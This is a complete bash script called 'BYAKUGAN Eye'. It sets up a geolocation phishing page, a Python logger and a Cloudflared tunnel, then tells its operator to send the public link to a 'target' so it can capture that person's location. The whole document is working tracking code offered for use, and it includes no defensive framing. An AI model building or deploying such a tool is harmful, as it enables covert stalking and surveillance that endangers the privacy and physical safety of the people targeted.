#!/bin/bash

# BYAKUGAN Eye - Location Tracker with Cloudflared

# Clear screen and show banner
clear
figlet BYAKUGAN | lolcat
echo -e "\n[+] Byakugan Eye Activated..." | lolcat

# Set variables
PORT=8083
WEBROOT="$HOME/byakugan_web"

# Create working directory
mkdir -p "$WEBROOT"

# HTML + CSS + JS for geolocation tracking
cat > "$WEBROOT/index.html" << 'EOF'
<!DOCTYPE html>
<html>
<head>
  <title>Byakugan Activated</title>
  <style>
    body {
      background-color: #000;
      color: #fff;
      font-family: monospace;
      text-align: center;
      margin-top: 20%;
    }
    h1 {
      color: red;
      font-size: 3em;
    }
    p {
      color: #ccc;
    }
  </style>
</head>
<body>
  <h1>BYAKUGAN</h1>
  <p>Activating Eye... Sharing your location</p>

  <script>
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(pos => {
        let lat = pos.coords.latitude;
        let lon = pos.coords.longitude;
        fetch(`/log?lat=${lat}&lon=${lon}`);
      }, err => {
        document.body.innerHTML += "<p>Location access denied.</p>";
      });
    } else {
      document.body.innerHTML += "<p>Geolocation not supported.</p>";
    }
  </script>
</body>
</html>
EOF

# Python logger to catch coordinates
cat > "$WEBROOT/logger.py" << 'EOF'
import http.server
import socketserver
from urllib.parse import urlparse, parse_qs

PORT = 8083

class ByakuganHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/log"):
            query = parse_qs(urlparse(self.path).query)
            lat = query.get("lat", [""])[0]
            lon = query.get("lon", [""])[0]
            if lat and lon:
                print(f"\n[+] Target Location: https://www.google.com/maps?q={lat},{lon}")
        return super().do_GET()

with socketserver.TCPServer(("", PORT), ByakuganHandler) as httpd:
    print(f"[*] Web server running on port {PORT}")
    httpd.serve_forever()
EOF

# Launch web server
cd "$WEBROOT"
echo -e "\n[+] Starting local server..." | lolcat
python3 logger.py &

sleep 2

# Launch Cloudflared
echo -e "\n[+] Starting Cloudflared tunnel..." | lolcat
CLOUDFLARE_URL=$(cloudflared tunnel --url http://localhost:$PORT --no-autoupdate 2>&1 | grep -o 'https://.*\.trycloudflare\.com')

# Output final link
echo -e "\n[+] Send this link to target to capture location:\n" | lolcat
echo "$CLOUDFLARE_URL" | lolcat

echo -e "\n[+] Waiting for target's location... (Ctrl+C to quit)" | lolcat

wait
